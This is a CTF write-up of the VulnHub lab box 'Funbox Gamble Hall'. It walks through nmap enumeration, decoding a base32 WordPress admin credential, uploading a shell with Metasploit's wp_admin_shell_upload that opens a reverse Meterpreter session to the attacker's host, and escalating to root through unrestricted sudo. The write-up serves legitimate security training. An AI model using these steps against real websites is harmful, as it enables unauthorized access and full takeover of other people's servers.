---
title: Vulnhub - Funbox Gamble Hall
description: My writeup on Funbox Gamble Hall box.
categories:
 - vulnhub
tags: vulnhub wordpress watch metasploit
---

![](https://filmdaily.co/wp-content/uploads/2020/03/Gamble-lede.jpg)

You can find the machine there > [Funbox Gamble Hall](https://www.vulnhub.com/entry/funbox-gamble-hall,551/){:target="_blank"}

## Summary

This was a really tricky box, that enjoyed pwning! The wordpress website is vulnerable only for some minutes, so we have to be fast! While website is vulnerable we can see admin commented his credentials using base32 so we can have easily a shell as www-data. Privesc to root is simple because we can run all commands as root! Let's pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

```
$ ip=192.168.1.12
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 15:52 EEST
Nmap scan report for funbox6.zte.com.cn (192.168.1.12)
Host is up (0.00020s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:18:41:BB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
$ nmap -p 22,80 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 15:56 EEST
Nmap scan report for funbox6.zte.com.cn (192.168.1.12)
Host is up (0.00051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0e:4f:3c:37:75:8a:a4:4d:bb:17:50:1b:ec:93:02:15 (RSA)
|   256 d7:dc:fc:b1:76:d6:76:13:da:ea:c4:30:04:bc:da:d2 (ECDSA)
|_  256 51:19:47:a6:29:c8:22:10:c2:73:34:ad:de:7f:57:d3 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://funbox6.box/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
```

The description of the box says to add `funbox6.box` in `/etc/hosts` so let's do this:

```
$ nano /etc/hosts
$ cat /etc/hosts
..data..
192.168.1.12    funbox6.box
```

Now when we browse the website we can see a wordpress site, and there is a really weird thing that says "OPENED":

![](https://i.imgur.com/H0Az7TY.png)

If we refresh the page after some minutes we can see now says "CLOSED":

![](https://i.imgur.com/eNRJQtp.png)

So my guess is:

```
OPENED -> EXPLOITABLE
CLOSED -> NO EXPLOITABLE
```

Probably there is a cronjob in the background, we can do a trick here so we don't have to refresh all the time! We will use the `watch` command to run `curl` every 1 second. When we see that greps OPENED we will fast enumerate the website & exploit it! :sunglasses:

```
$ watch -n 1 'curl http://funbox6.box/ | grep OPENED'
```

![](https://i.imgur.com/n64LLvf.png)

Perfect, now if we go to read the blog we can see an admin comment:

![](https://i.imgur.com/nopeoPn.png)

That's base32 because base32 uses as alphabet A-Z / 2-7, let's decode it:

```
$ echo MFSG22LOHJTWC3LCNRSWQYLMNQ3TONY= | base32 -d
admin:gamblehall777
```

## Shell as www-data

Perfect we have the admin creds, we can use metasploit now to spawn a reverse shell fast.

```
msf5 > use exploit/unix/webapp/wp_admin_shell_upload
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
USERNAME => admin
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD gamblehall777
PASSWORD => gamblehall777
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set vhost funbox6.box
vhost => funbox6.box
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.1.12
RHOSTS => 192.168.1.12
msf5 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.14:4444 
[*] Authenticating with WordPress using admin:gamblehall777...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/QPJokoCSRJ/MaNyQsLESx.php...
[*] Sending stage (38288 bytes) to 192.168.1.12
[*] Meterpreter session 1 opened (192.168.1.14:4444 -> 192.168.1.12:48274) at 2020-09-25 16:20:34 +0300
[+] Deleted MaNyQsLESx.php
[+] Deleted QPJokoCSRJ.php
[+] Deleted ../QPJokoCSRJ

meterpreter > shell
Process 2355 created.
Channel 0 created.
python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@funbox6:$ 
```

## Shell as root

Now if we check `sudo -l` we can execute all commands as root!

```
www-data@funbox6:$ sudo -l
Matching Defaults entries for www-data on funbox6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on funbox6:
    (root) NOPASSWD: ALL
www-data@funbox6:$ sudo bash
root@funbox6:~# whoami;id 
root
uid=0(root) gid=0(root) groups=0(root)
root@funbox6:~# 
```

Let's read the flag:

![](https://i.imgur.com/3jgiNhP.png)

That a tricky box! :smile:
